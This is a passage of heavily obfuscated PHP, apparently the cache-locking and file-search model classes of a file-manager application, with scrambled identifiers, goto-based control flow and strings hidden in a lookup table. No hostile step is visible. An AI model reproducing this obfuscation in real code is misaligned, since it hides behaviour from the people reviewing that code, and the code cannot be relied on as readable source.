$fŒØ‹À†ø = $E°¼ÅôÇ­í->handle->add($Bî¯ß‘Èô, $Eá˜é“ÂÔ, $D™–á‹±“Ç); if ($fŒØ‹À†ø) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F×ÓìŸİå) { return Cache::init()->get($F×ÓìŸİå); } public function unlock($dÁ‘â¸¹Ş) { return Cache::init()->remove($dÁ‘â¸¹Ş); } } class CacheLockDatabase { public function lock($Fªß¡†Å„¾, $d½¼‡‘‘ = 0) { $c–ˆ¾®—”° = Model($_SERVER[›èö’ù¤][820]); $aÃŞ´ÀÚ²ä = microtime(!0) + $d½¼‡‘‘; while (microtime(!0) < $aÃŞ´ÀÚ²ä) { $Dà£ˆØå‰‘ = $c–ˆ¾®—”°->get($Fªß¡†Å„¾); if (!$Dà£ˆØå‰‘ || $Dà£ˆØå‰‘ < microtime(!0)) { $dˆÉ£ÈÄ‡ò = $c–ˆ¾®—”°->set($Fªß¡†Å„¾, $aÃŞ´ÀÚ²ä); if ($dˆÉ£ÈÄ‡ò) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eº‰ñßÒÏ) { return Model($_SERVER[›èö’ù¤][820])->get($eº‰ñßÒÏ); } public function unlock($Dâ•ÓŠÙ„î) { Model($_SERVER[›èö’ù¤][820])->remove($Dâ•ÓŠÙ„î); } } goto cƒ†¥‹¥ƒ­; eŠ¶ĞÇØº: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Bâåò…¡) { goto Dš†²ÉêŒ‡; E†®à¦×«Ş: if (!$FîŸí›áÀƒ) { return array(); } $C…­¼¿ÚœÖ = $FîŸí›áÀƒ[$BÜÖ¬Š‚“[168]]; $a¾ô§îÄ¨ß = $BÜÖ¬Š‚“[7]; goto aÄÀïÏ—ï; aÄÀïÏ—ï: if (!$FîŸí›áÀƒ[$BÜÖ¬Š‚“[168]]) { $b ƒ°ùÒáã = array_to_keyvalue($eáÉ‘ÎÁ£‰, $BÜÖ¬Š‚“[33], $BÜÖ¬Š‚“[168]); $C…­¼¿ÚœÖ = implode($BÜÖ¬Š‚“[47], $b ƒ°ùÒáã); $a¾ô§îÄ¨ß = $BÜÖ¬Š‚“[1964]; } $A¨³ÈŞÑ±˜ = explode($BÜÖ¬Š‚“[47], trim($C…­¼¿ÚœÖ, $BÜÖ¬Š‚“[47])); return array($a¾ô§îÄ¨ß, $A¨³ÈŞÑ±˜); goto D‰¾µµÑÎ¿; Dš†²ÉêŒ‡: $BÜÖ¬Š‚“ =& $_SERVER[›èö’ù¤]; $eáÉ‘ÎÁ£‰ = KodIO::fileTypeList(); $FîŸí›áÀƒ = $eáÉ‘ÎÁ£‰[$Bâåò…¡]; goto E†®à¦×«Ş; D‰¾µµÑÎ¿: } public function listPathType($b°×òš‹„Ï) { $AÀé‹ìê¾ô =& $_SERVER[›èö’ù¤]; $a‰ÇçÌÃ = $this->fileTypeWhere($b°×òš‹„Ï); if (!$a‰ÇçÌÃ) { return array(); } $eÀ‹¹ùÇ¦ = array($AÀé‹ìê¾ô[575] => SourceModel::TYPE_USER, $AÀé‹ìê¾ô[576] => USER_ID, $AÀé‹ìê¾ô[572] => 0, $AÀé‹ìê¾ô[573] => $a‰ÇçÌÃ); return $this->listSource($eÀ‹¹ùÇ¦); } public function listSearch($EÊ¯ùÈÔ„à, $d±åñïåƒŞ = 300) { goto e©àÃŞŞ¦ø; F÷Û÷ˆŞËµ: $this->_listDataApply($b‚­§Œ¶½[$f‡¦˜ßæ[367]]); $this->_listMake($b‚­§Œ¶½); return $b‚­§Œ¶½; goto FÎ»‹ÎË² ; f°—ÌõÏ½ë: $dµäÒÒˆˆ„ = $eœèï±ôš; $this->_listSearchBindPinyin($EÊ¯ùÈÔ„à, $Cì¹×ÅîÔğ, $eœèï±ôš); $this->alias($f‡¦˜ßæ[439])->_makeOrder(); goto f¯õß¯­ğê; f¯õß¯­ğê: $Cì¹×ÅîÔğ = $this->parseWhereLike($Cì¹×ÅîÔğ); $b‚­§Œ¶½ = $this->distinct(!0)->field($eœèï±ôš)->where($Cì¹×ÅîÔğ)->selectPage($d±åñïåƒŞ); $this->_listSearchFileContent($b‚­§Œ¶½, $EÊ¯ùÈÔ„à, $dµäÒÒˆˆ„, $FÔŞÍğ¾Ú); goto FéÈàòºÉ¯; FéÈàòºÉ¯: $this->_listSearchDesc($b‚­§Œ¶½, $EÊ¯ùÈÔ„à, $dµäÒÒˆˆ„); $this->_listSearchTag($b‚­§Œ¶½, $EÊ¯ùÈÔ„à, $dµäÒÒˆˆ„); $this->_listSearchGroupTag($b‚­§Œ¶½, $EÊ¯ùÈÔ„à, $dµäÒÒˆˆ„); goto F÷Û÷ˆŞËµ; e©àÃŞŞ¦ø: $f‡¦˜ßæ =& $_SERVER[›èö’ù¤]; if (isset($EÊ¯ùÈÔ„à[$f‡¦˜ßæ[1808]]) && $EÊ¯ùÈÔ„à[$f‡¦˜ßæ[1808]]) { $EÊ¯ùÈÔ„à[$f‡¦˜ßæ[1808]] = str_replace($f‡¦˜ßæ[382], $f‡¦˜ßæ[1965], trim($EÊ¯ùÈÔ„à[$f‡¦˜ßæ[1808]])); } $Cì¹×ÅîÔğ = $this->_parseSearchWhere($EÊ¯ùÈÔ„à); goto FÅ¸ôêæç¹; FÅ¸ôêæç¹: $FÔŞÍğ¾Ú = $Cì¹×ÅîÔğ; if (!isset($Cì¹×ÅîÔğ[$f‡¦˜ßæ[425]])) { $Cì¹×ÅîÔğ[$f‡¦˜ßæ[425]] = 0; } $eœèï±ôš = $f‡¦˜ßæ[1966]; goto f°—ÌõÏ½ë; FÎ»‹ÎË² : } private function _listSearchFileContent(&$aôÌŠÇŸĞŠ, $CÃ–ëĞñŞ´, $d©Ëôö„±Ú, $a•ó»ğ«½ã) { goto F¤ŒÉêèš; F¤ŒÉêèš: $A‘Ş×ÄÉ‘È =& $_SERVER[›èö’ù¤]; if (!$CÃ–ëĞñŞ´[$A‘Ş×ÄÉ‘È[1808]] || $aôÌŠÇŸĞŠ[$A‘Ş×ÄÉ‘È[364]][$A‘Ş×ÄÉ‘È[351]] > 1) { return; } if (!isset($a•ó»ğ«½ã[$A‘Ş×ÄÉ‘È[28]]) || !is_array($CÃ–ëĞñŞ´[$A‘Ş×ÄÉ‘È[462]])) { return; } goto fËœí¯Ì†º; fËœí¯Ì†º: $a•ó»ğ«½ã[$A‘Ş×ÄÉ‘È[462]] = array($A‘Ş×ÄÉ‘È[7], $CÃ–ëĞñŞ´[$A‘Ş×ÄÉ‘È[462]]); unset($a•ó»ğ«½ã[$A‘Ş×ÄÉ‘È[28]]); unset($CÃ–ëĞñŞ´[$A‘Ş×ÄÉ‘È[462]]); goto A®ß¢Ôˆ”à; A®ß¢Ôˆ”à: $fö‘¨«ñ¬ = $this->field($d©Ëôö„±Ú)->where($a•ó»ğ«½ã)->limit($A‘Ş×ÄÉ‘È[1967])->select(); if (!$fö‘¨«ñ¬ || count($fö‘¨«ñ¬) == 0) { return; } $aôÌŠÇŸĞŠ[$A‘Ş×ÄÉ‘È[367]] = array_merge($fö‘¨«ñ¬, $aôÌŠÇŸĞŠ[$A‘Ş×ÄÉ‘È[367]]); goto E›áÀÍİ«‡; E›áÀÍİ«‡: $aôÌŠÇŸĞŠ[$A‘Ş×ÄÉ‘È[364]][$A‘Ş×ÄÉ‘È[365]] += count($fö‘¨«ñ¬); goto FÜÈÆÇÕÃ¶; FÜÈÆÇÕÃ¶: } private function _listSearchTag(&$Dã°Èš‹ª´, $D¦„¿ãùŸ, $D¿ÕÖõ°) { goto fšªå‹×öª; b•Óš£Š°: $eŠ´˜Ù‡Õ‡ = array(); $bèšë¬Ñ—ƒ = $D¦„¿ãùŸ[$fŠèÖÙŠ[1808]]; foreach ($BˆÛˆù§µÌ as $DÌÔäšå­ä) { $E´è²ÒÛ¢ = $DÌÔäšå­ä[$fŠèÖÙŠ[28]]; $Eì¦µõ›¼á = str_replace($fŠèÖÙŠ[50], $fŠèÖÙŠ[33], Pinyin::get($E´è²ÒÛ¢)); if (stripos($E´è²ÒÛ¢, $bèšë¬Ñ—ƒ) !== !1 || stripos($Eì¦µõ›¼á, $bèšë¬Ñ—ƒ) !== !1) { $eŠ´˜Ù‡Õ‡[] = $DÌÔäšå­ä[$fŠèÖÙŠ[395]]; } } goto Cè«Ûà³Úá; fšªå‹×öª: $fŠèÖÙŠ =& $_SERVER[›èö’ù¤]; if (!$D¦„¿ãùŸ[$fŠèÖÙŠ[1808]] || $Dã°Èš‹ª´[$fŠèÖÙŠ[364]][$fŠèÖÙŠ[351]] > 1) { return; } $BˆÛˆù§µÌ = Model($fŠèÖÙŠ[1968])->listData(); goto b•Óš£Š°; Cè«Ûà³Úá: if (!$eŠ´˜Ù‡Õ‡) { return; } $B‹×É½ÚŞ† = array($fŠèÖÙŠ[421] => array($fŠèÖÙŠ[7], $eŠ´˜Ù‡Õ‡), $fŠèÖÙŠ[1551] => USER_ID); $EÁ¢© †³£ = Model($fŠèÖÙŠ[422])->field($fŠèÖÙŠ[76])->where($B‹×É½ÚŞ†)->select(); goto eÕ¤‹ÄÍáá; eÕ¤‹ÄÍáá: $EÁ¢© †³£ = array_to_keyvalue($EÁ¢© †³£, $fŠèÖÙŠ[33], $fŠèÖÙŠ[76]); $CÚ‘Åˆì¡ = array_unique($EÁ¢© †³£); $this->_listSearchMerge($Dã°Èš‹ª´, $D¦„¿ãùŸ, $D¿ÕÖõ°, $CÚ‘Åˆì¡); goto bÎ¤™Êù; bÎ¤™Êù: } private function _listSearchDesc(&$eìÖ®‘Â¨, $f…Æƒ„­…¨, $bĞãæî·¡¿) { goto BÂ‹»«¡ˆß; BÂ‹»«¡ˆß: $f«–‰ñ½ =& $_SERVER[›èö’ù¤]; if (!$f…Æƒ„­…¨[$f«–‰ñ½[1808]] || $eìÖ®‘Â¨[$f«–‰ñ½[364]][$f«–‰ñ½[351]] > 1) { return; } $DÎŒÁâÑÏ = $this->listSearchChildren($f…Æƒ„­…¨[$f«–‰ñ½[493]]); goto C÷´±ËÒ¾; C÷´±ËÒ¾: $DÎŒÁâÑÏ = array_unique($DÎŒÁâÑÏ); if (!$DÎŒÁâÑÏ) { return; } $b““í·¥ = array($f«–‰ñ½[397] => array($f«–‰ñ½[7], $DÎŒÁâÑÏ), $f«–‰ñ½[93] => $f«–‰ñ½[446], $f«–‰ñ½[372] => array($f«–‰ñ½[381], $f«–‰ñ½[1810] . $f…Æƒ„­…¨[$f«–‰ñ½[1808]] . $f«–‰ñ½[1810])); goto cíÂëÌóæÔ; cíÂëÌóæÔ: $F­·…Å ½¸ = Model($f«–‰ñ½[558])->field($f«–‰ñ½[397])->where($b““í·¥)->select(); $Aù² –¢¾Ø = array_to_keyvalue($F­·…Å ½¸, $f«–‰ñ½[33], $f«–‰ñ½[397]); $this->_listSearchMerge($eìÖ®‘Â¨, $f…Æƒ„­…¨, $bĞãæî·¡¿, $Aù² –¢¾Ø); goto bŠÁœ“ò„¸; bŠÁœ“ò„¸: } private function _listSearchGroupTag(&$bÂ¹âãµ†, $c­¹Ã¶•²´, $D¢â Ô„ÌÆ) { goto BŒÌì’Ã¶É; Fò ›«Õ‡ˆ: if (!$føÆ²ÀÊØ¨) { return; } $E¶Œğ˜á = array($d—§«ºµ±›[421] => array($d—§«ºµ±›[7], $føÆ²ÀÊØ¨), $d—§«ºµ±›[1551] => 0, $d—§«ºµ±›[29] => $d—§«ºµ±›[1832] . $B¨×›½Ÿ¯’); $dêŞíÕ«§Ò = Model($d—§«ºµ±›[422])->field($d—§«ºµ±›[76])->where($E¶Œğ˜á)->select(); goto cÑ¯øÊ£æ; cÑ¯øÊ£æ: $dêŞíÕ«§Ò = array_to_keyvalue($dêŞíÕ«§Ò, $d—§«ºµ±›[33], $d—§«ºµ±›[76]); $B®ÇÙš» ‡ = array_unique($dêŞíÕ«§Ò); $this->_listSearchMerge($bÂ¹âãµ†, $c­¹Ã¶•²´, $D¢â Ô„ÌÆ, $B®ÇÙš» ‡); goto d¨ˆÔ‹ÔÓé; BŒÌì’Ã¶É: $d—§«ºµ±› =& $_SERVER[›èö’ù¤]; if (!$c­¹Ã¶•²´[$d—§«ºµ±›[1808]] || $bÂ¹âãµ†[$d—§«ºµ±›[364]][$d—§«ºµ±›[351]] > 1 || !$c­¹Ã¶•²´[$d—§«ºµ±›[493]]) { return; } $CËÌ²âïç = $this->sourceInfo($c­¹Ã¶•²´[$d—§«ºµ±›[493]]); goto Aî¸óîÔßà; Aî¸óîÔßà: if (!$CËÌ²âïç || $CËÌ²âïç[$d—§«ºµ±›[406]] != SourceModel::TYPE_GROUP) { return; } $B¨×›½Ÿ¯’ = $CËÌ²âïç[$d—§«ºµ±›[499]]; $F³ï…©” = Model($d—§«ºµ±›[1969])->get($B¨×›½Ÿ¯’); goto f³›¿ç–Ÿ; f³›¿ç–Ÿ: $føÆ²ÀÊØ¨ = array(); $aÖ©ì¯ùÜ› = $c­¹Ã¶•²´[$d—§«ºµ±›[1808]]; foreach ($F³ï…©”[$d—§«ºµ±›[367]] as $Fš¦Ë¹§ÇŸ) { $F×ÊŠ¿• = $Fš¦Ë¹§ÇŸ[$d—§«ºµ±›[28]]; $FåºŸÂÇßÛ = str_replace($d—§«ºµ±›[50], $d—§«ºµ±›[33], Pinyin::get($F×ÊŠ¿•)); if (stripos($F×ÊŠ¿•, $aÖ©ì¯ùÜ›) !== !1 || stripos($FåºŸÂÇßÛ, $aÖ©ì¯ùÜ›) !== !1) { $føÆ²ÀÊØ¨[] = $Fš¦Ë¹§ÇŸ[$d—§«ºµ±›[395]]; } } goto Fò ›«Õ‡ˆ; d¨ˆÔ‹ÔÓé: } private function _listSearchMerge(&$fö ÆŠ±£é, $eùÄ’‹¸øì, $fï‰´Á¦ÈÃ, $FÊÅõÖÅô) { goto d¸ ÅÁÅŞ¡; d¸ ÅÁÅŞ¡: $Bø¥­÷÷«› =& $_SERVER[›èö’ù¤]; if (!$FÊÅõÖÅô) { return; } $b¨Á½Äœ§Ş = array_to_keyvalue($fö ÆŠ±£é[$Bø¥­÷÷«›[367]], $Bø¥­÷÷«›[33], $Bø¥­÷÷«›[397]); goto cÒ¢—Æ«ˆ; Eˆ­Ê“Šß: foreach ($FèÔ‡åÀ„Ä as $a‡¯‰âçÜ) { if ($this->_listSearchFilter($a‡¯‰âçÜ, $eùÄ’‹¸øì)) { $FŞ½áğÌ[] = $a‡¯‰âçÜ; } } $fö ÆŠ±£é[$Bø¥­÷÷«›[367]] = array_merge($FŞ½áğÌ, $fö ÆŠ±£é[$Bø¥­÷÷«›[367]]); $fö ÆŠ±£é[$Bø¥­÷÷«›[364]][$Bø¥­÷÷«›[365]] += count($FŞ½áğÌ); goto CÈ¬¤²ÛÃ; cÒ¢—Æ«ˆ: $FÀÃĞõ¶¸ = array_diff($FÊÅõÖÅô, $b¨Á½Äœ§Ş); if (!$FÀÃĞõ¶¸) { return; } $c„˜ô–ñÙ = array($Bø¥­÷÷«›[397] => array($Bø¥­÷÷«›[7], $FÀÃĞõ¶¸)); goto f´Ç³³Íä; f´Ç³³Íä: $FèÔ‡åÀ„Ä = $this->field($fï‰´Á¦ÈÃ)->where($c„˜ô–ñÙ)->select(); if (!$FèÔ‡åÀ„Ä) { return; } $FŞ½áğÌ = array(); goto Eˆ­Ê“Šß; CÈ¬¤²ÛÃ: } private function _listSearchFilter($D‹¥µŒ¹•¡, $B¡ˆöáÁß) { goto BŸºÏòŒ£; F‹‹ÒŒàÖ¨: if (isset($B¡ˆöáÁß[$f„¡ÒÇªƒ[589]]) && $B¡ˆöáÁß[$f„¡ÒÇªƒ[589]] != $D‹¥µŒ¹•¡[$f„¡ÒÇªƒ[449]]) { return !1; } return !0; goto f°·Õ‰İ§; BŸºÏòŒ£: $f„¡ÒÇªƒ =& $_SERVER[›èö’ù¤]; $Fï©Ç©Âµ— = $D‹¥µŒ¹•¡[$f„¡ÒÇªƒ[405]] == $f„¡ÒÇªƒ[87]; if (!strstr($D‹¥µŒ¹•¡[$f„¡ÒÇªƒ[516]], $f„¡ÒÇªƒ[47] . $B¡ˆöáÁß[$f„¡ÒÇªƒ[493]] . $f„¡ÒÇªƒ[47])) { return !1; } goto dî”¬šéŒ˜; dî”¬šéŒ˜: if (isset($B¡ˆöáÁß[$f„¡ÒÇªƒ[407]]) && $B¡ˆöáÁß[$f„¡ÒÇªƒ[407]] != $f„¡ÒÇªƒ[1774]) { if ($B¡ˆöáÁß[$f„¡ÒÇªƒ[407]] == $f„¡ÒÇªƒ[77] && !$Fï©Ç©Âµ—) { return !1; } if ($B¡ˆöáÁß[$f„¡ÒÇªƒ[407]] != $f„¡ÒÇªƒ[77] && $Fï©Ç©Âµ—) { return !1; } if (!strstr($D‹¥µŒ¹•¡[$f„¡ÒÇªƒ[168]], $f„¡ÒÇªƒ[47] . $B¡ˆöáÁß[$f„¡ÒÇªƒ[407]] . $f„¡ÒÇªƒ[47])) { return !1; } } if (isset($B¡ˆöáÁß[$f„¡ÒÇªƒ[1970]]) && $B¡ˆöáÁß[$f„¡ÒÇªƒ[1970]] < $D‹¥µŒ¹•¡[$f„¡ÒÇªƒ[78]]) { return !1; } if (isset($B¡ˆöáÁß[$f„¡ÒÇªƒ[1971]]) && $B¡ˆöáÁß[$f„¡ÒÇªƒ[1971]] > $D‹¥µŒ¹•¡[$f„¡ÒÇªƒ[78]]) { return !1; } goto F‹‹ÒŒàÖ¨; f°·Õ‰İ§: } public function listSearchChildren($CœĞ¿œ¢ùí, $FÏ«¼ôà = 5000) { goto D²¹›¢¤ºÎ; aà¨¼÷ğ‰: $F¤§‚¬ãò„ = $this->field($CÜ¦Èèà¨‚[397])->where($C‚ÃÎŞİæ)->select(); $C×—¢÷Ë¯ = array_to_keyvalue($F¤§‚¬ãò„, $CÜ¦Èèà¨‚[33], $CÜ¦Èèà¨‚[397]); return $C×—¢÷Ë¯; goto AÔ…ßæÔîµ; D•³£”à„˜: $C‚ÃÎŞİæ = array($CÜ¦Èèà¨‚[516] => array($CÜ¦Èèà¨‚[381], $bÔ‹Í¶œ›È[$CÜ¦Èèà¨‚[516]] . $bÔ‹Í¶œ›È[$CÜ¦Èèà¨‚[397]] . $CÜ¦Èèà¨‚[540])); $eòƒåç¥†ô = $this->field($CÜ¦Èèà¨‚[397])->cache(null, 600)->where($C‚ÃÎŞİæ)->count(); if ($eòƒåç¥†ô > $FÏ«¼ôà) { return $this->_listSearchChildrenNear($CœĞ¿œ¢ùí, $FÏ«¼ôà); } goto aà¨¼÷ğ‰; D²¹›¢¤ºÎ: $CÜ¦Èèà¨‚ =& $_SERVER[›èö’ù¤]; $C×—¢÷Ë¯ = array(); $bÔ‹Í¶œ›È = $this->sourceInfo($CœĞ¿œ¢ùí); goto D•³£”à„˜; AÔ…ßæÔîµ: } private function _listSearchChildrenNear($e«’ÛÖäÍ, $b¨†ƒœÑòî) { goto dÃÔ‘‡£‘Ó; BÙá¬”–³ù: $B‘áµß¢ ‡ = $this->field($E‚œøŸÕ‘[1972])->where($E×¸½Ûñˆ)->select(); $cÔÎğğïîô = array_to_keyvalue(array_filter_by_field($B‘áµß¢ ‡, $E‚œøŸÕ‘[405], $E‚œøŸÕ‘[87]), $E‚œøŸÕ‘[33], $E‚œøŸÕ‘[397]); $A½º·Şß²– = array_merge($A½º·Şß²–, array_to_keyvalue($B‘áµß¢ ‡, $E‚œøŸÕ‘[33], $E‚œøŸÕ‘[397])); goto dãË®‹æù; dÃÔ‘‡£‘Ó: $E‚œøŸÕ‘ =& $_SERVER[›èö’ù¤]; $A½º·Şß²– = array(); $E×¸½Ûñˆ = array($E‚œøŸÕ‘[493] => $e«’ÛÖäÍ); goto BÙá¬”–³ù; dãË®‹æù: if (!$cÔÎğğïîô) { return $A½º·Şß²–; } $E×¸½Ûñˆ = array($E‚œøŸÕ‘[493] => array($E‚œøŸÕ‘[7], $cÔÎğğïîô)); $B‘áµß¢ ‡ = $this->field($E‚œøŸÕ‘[1972])->where($E×¸½Ûñˆ)->limit($b¨†ƒœÑòî)->select(); goto CãÃ·¬¿†È; CãÃ·¬¿†È: $A½º·Şß²– = array_merge($A½º·Şß²–, array_to_keyvalue($B‘áµß¢ ‡, $E‚œøŸÕ‘[33], $E‚œøŸÕ‘[397])); $A½º·Şß²– = array_slice($A½º·Şß²–, 0, $b¨†ƒœÑòî); return $A½º·Şß²–; goto Cø‹¨ÂÂèÏ; Cø‹¨ÂÂèÏ: } private function _listSearchBindPinyin($CËÁá÷Ì¢õ, &$dòµ¨Á†Š×, &$EØéÏ…öª„) { goto bóÙ •Ùµƒ; Eù²‚ˆ–Ù‘: foreach ($dòµ¨Á†Š× as $BíòßÄËÜ => $f ëùÀÁ‹Æ) { $Cª¥œöìÇ•[$B™š°Ü£ì[431] . $BíòßÄËÜ] = $f ëùÀÁ‹Æ; } foreach ($A¨¶‚ÛÓ‰ as $cªÎÔÖšù¢) { $Cª¥œöìÇ•[] = array($B™š°Ü£ì[436] => $cªÎÔÖšù¢, $B™š°Ü£ì[983] => $B™š°Ü£ì[1812], array($B™š°Ü£ì[1974] => $cªÎÔÖšù¢, $B™š°Ü£ì[1975] => array($B™š°Ü£ì[7], array($B™š°Ü£ì[459], $B™š°Ü£ì[458])))); } $this->join($EŒ¦ÆŠ¹‡ó); goto Bƒ¬½ñÅ®–; Bƒ¬½ñÅ®–: $dòµ¨Á†Š× = $Cª¥œöìÇ•; goto cãó†ÛÚƒî; fç›µ¢ó´: $EØéÏ…öª„ = $B™š°Ü£ì[431] . str_replace($B™š°Ü£ì[47], $B™š°Ü£ì[432], $EØéÏ…öª„); $A¨¶‚ÛÓ‰ = $dòµ¨Á†Š×[$B™š°Ü£ì[28]]; unset($dòµ¨Á†Š×[$B™š°Ü£ì[28]]); goto Eù²‚ˆ–Ù‘; aù”ğê‰‰â: $EŒ¦ÆŠ¹‡ó = "\x4c\105\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\151\157\137\x73\x6f\165\x72\143\145\137\x6d\145\164\x61\x20\x6d\x65\x74\141\40\157\156\40\163\157\x75\162\143\x65\56\163\157\x75\162\143\145\x49\104\x20\x3d\40\155\145\164\x61\56\163\157\165\162\143\x65\111\104"; $Cª¥œöìÇ• = array(); $EØéÏ…öª„ = str_replace(array($B™š°Ü£ì[229], $B™š°Ü£ì[50], $B™š°Ü£ì[1973]), $B™š°Ü£ì[33], $EØéÏ…öª„); goto fç›µ¢ó´; bóÙ •Ùµƒ: $B™š°Ü£ì =& $_SERVER[›èö’ù¤]; if (!isset($CËÁá÷Ì¢õ[$B™š°Ü£ì[1808]]) || !$CËÁá÷Ì¢õ[$B™š°Ü£ì[1808]]) { return; } if (!Input::check($CËÁá÷Ì¢õ[$B™š°Ü£ì[1808]], $B™š°Ü£ì[316]) || strlen($CËÁá÷Ì¢õ[$B™š°Ü£ì[1808]]) < 2) { return; } goto aù”ğê‰‰â; cãó†ÛÚƒî: } private function _parseSearchWhere($E’ÛŞŸŸçÉ) { goto eÒÈ´Äè; eÒÈ´Äè: $AÔìóØè®â =& $_SERVER[›èö’ù¤]; $d‹ôğ“›èè = array(); if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[745]]) && $E’ÛŞŸŸçÉ[$AÔìóØè®â[745]]) { $d‹ôğ“›èè[$AÔìóØè®â[84]] = array($AÔìóØè®â[1976], $E’ÛŞŸŸçÉ[$AÔìóØè®â[745]]); } goto D©âŒà¦¢›; c™†ë±˜Ö: if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[589]]) && $E’ÛŞŸŸçÉ[$AÔìóØè®â[589]]) { $d‹ôğ“›èè[] = array($AÔìóØè®â[449] => $E’ÛŞŸŸçÉ[$AÔìóØè®â[589]], $AÔìóØè®â[447] => $E’ÛŞŸŸçÉ[$AÔìóØè®â[589]], $AÔìóØè®â[983] => $AÔìóØè®â[1812]); } if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[407]]) && $E’ÛŞŸŸçÉ[$AÔìóØè®â[407]]) { $EÑÁÖ‘¡“ = $E’ÛŞŸŸçÉ[$AÔìóØè®â[407]]; if ($EÑÁÖ‘¡“ == $AÔìóØè®â[77]) { $d‹ôğ“›èè[$AÔìóØè®â[405]] = 1; } else { if ($EÑÁÖ‘¡“ == $AÔìóØè®â[1979]) { $d‹ôğ“›èè[$AÔìóØè®â[405]] = 0; } else { if ($EÑÁÖ‘¡“) { $EÑÁÖ‘¡“ = is_array($EÑÁÖ‘¡“) ? $EÑÁÖ‘¡“ : explode($AÔìóØè®â[47], $EÑÁÖ‘¡“); $d‹ôğ“›èè[$AÔìóØè®â[407]] = array($AÔìóØè®â[413], $EÑÁÖ‘¡“); $d‹ôğ“›èè[$AÔìóØè®â[405]] = 0; } } } } $this->_parseSearchParent($E’ÛŞŸŸçÉ, $d‹ôğ“›èè); goto CÎ¿ÏÇ•„â; CÎ¿ÏÇ•„â: if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[1808]]) && trim($E’ÛŞŸŸçÉ[$AÔìóØè®â[1808]])) { $CÑ÷¿’ÛÉª = trim($E’ÛŞŸŸçÉ[$AÔìóØè®â[1808]]); $bÙ­ˆÆÉ¦Ú = explode($AÔìóØè®â[50], $CÑ÷¿’ÛÉª); if (strlen($CÑ÷¿’ÛÉª) > 2 && (substr($CÑ÷¿’ÛÉª, 0, 1) == $AÔìóØè®â[116] && substr($CÑ÷¿’ÛÉª, -1) == $AÔìóØè®â[116]) || substr($CÑ÷¿’ÛÉª, 0, 1) == $AÔìóØè®â[55] && substr($CÑ÷¿’ÛÉª, -1) == $AÔìóØè®â[55]) { $CÑ÷¿’ÛÉª = substr($CÑ÷¿’ÛÉª, 1, -1); $bÙ­ˆÆÉ¦Ú = array($CÑ÷¿’ÛÉª); } $d‹ôğ“›èè[$AÔìóØè®â[28]] = array(array($AÔìóØè®â[539], $AÔìóØè®â[1810] . $CÑ÷¿’ÛÉª . $AÔìóØè®â[1810])); if (count($bÙ­ˆÆÉ¦Ú) > 1) { $d‹ôğ“›èè[$AÔìóØè®â[28]] = array(); foreach ($bÙ­ˆÆÉ¦Ú as $dŒÍ¬Õ§â) { if (!trim($dŒÍ¬Õ§â)) { continue; } $d‹ôğ“›èè[$AÔìóØè®â[28]][] = array($AÔìóØè®â[539], $AÔìóØè®â[1810] . trim($dŒÍ¬Õ§â) . $AÔìóØè®â[1810]); } } } return $d‹ôğ“›èè; goto Cğˆäª‘‚Ğ; D©âŒà¦¢›: if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[491]]) && $E’ÛŞŸŸçÉ[$AÔìóØè®â[491]]) { $A¿®œÆ†Ìå = array($AÔìóØè®â[1977], $E’ÛŞŸŸçÉ[$AÔìóØè®â[491]]); if ($d‹ôğ“›èè[$AÔìóØè®â[84]]) { $d‹ôğ“›èè[$AÔìóØè®â[84]] = array($d‹ôğ“›èè[$AÔìóØè®â[84]], $A¿®œÆ†Ìå, $AÔìóØè®â[1978]); } else { $d‹ôğ“›èè[$AÔìóØè®â[84]] = $A¿®œÆ†Ìå; } } if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[1970]]) && $E’ÛŞŸŸçÉ[$AÔìóØè®â[1970]] > 0) { $d‹ôğ“›èè[$AÔìóØè®â[78]] = array($AÔìóØè®â[1976], $E’ÛŞŸŸçÉ[$AÔìóØè®â[1970]]); } if (isset($E’ÛŞŸŸçÉ[$AÔìóØè®â[1971]]) && $E’ÛŞŸŸçÉ[$AÔìóØè®â[1971]]) { $A¿®œÆ†Ìå = array($AÔìóØè®â[1977], $E’ÛŞŸŸçÉ[$AÔìóØè®â[1971]]); if ($d‹ôğ“›èè[$AÔìóØè®â[78]]) { $d‹ôğ“›èè[$AÔìóØè®â[78]] = array($d‹ôğ“›èè[$AÔìóØè®â[78]], $A¿®œÆ†Ìå, $AÔìóØè®â[1978]); } else { $d‹ôğ“›èè[$AÔìóØè®â[78]] = $A¿®œÆ†Ìå; } } goto c™†ë±˜Ö; Cğˆäª‘‚Ğ: } private function _parseSearchParent($aÕ‰”§öùø, &$E‹‡ğø°°) { goto DÓĞ‡Ãä; AË…¶¸éÀœ: $cŒ¾¦İ›’‘ = $FâÚãõ¡í[$aœæ×«†Ü†[499]] . $aœæ×«†Ü†[33]; if ($cŒ¾¦İ›’‘ == $aœæ×«†Ü†[87]) { unset($E‹‡ğø°°[$aœæ×«†Ü†[579]]); $E‹‡ğø°°[$aœæ×«†Ü†[406]] = self::TYPE_GROUP; return; } $b†Îùš±Ò = Model($aœæ×«†Ü†[517])->groupChildrenAll($cŒ¾¦İ›’‘); goto b¹åÂ† Û¡; b¹åÂ† Û¡: $Cù™È¼£×° = count($b†Îùš±Ò); if ($Cù™È¼£×° <= 1) { return; } $FËƒ¼ÎİÄ = array($aœæ×«†Ü†[493] => 0, $aœæ×«†Ü†[406] => self::TYPE_GROUP, $aœæ×«†Ü†[499] => array($aœæ×«†Ü†[7], $b†Îùš±Ò)); goto b‘Ï¨¶àñ; dÇò’‹öˆç: $E‹‡ğø°°[$aœæ×«†Ü†[579]][] = $aœæ×«†Ü†[1812]; goto B®ëò§¨Êî; b‘Ï¨¶àñ: $fíÇ¾ã¦â  = $this->field($aœæ×«†Ü†[1980])->where($FËƒ¼ÎİÄ)->limit($Cù™È¼£×°)->select(); $E‹‡ğø°°[$aœæ×«†Ü†[579]] = array(); foreach ($fíÇ¾ã¦â  as $dœ¶Òù°óÛ) { $E‹‡ğø°°[$aœæ×«†Ü†[579]][] = array($aœæ×«†Ü†[539], $aœæ×«†Ü†[526] . $dœ¶Òù°óÛ[$aœæ×«†Ü†[397]] . $aœæ×«†Ü†[540]); } goto dÇò’‹öˆç; 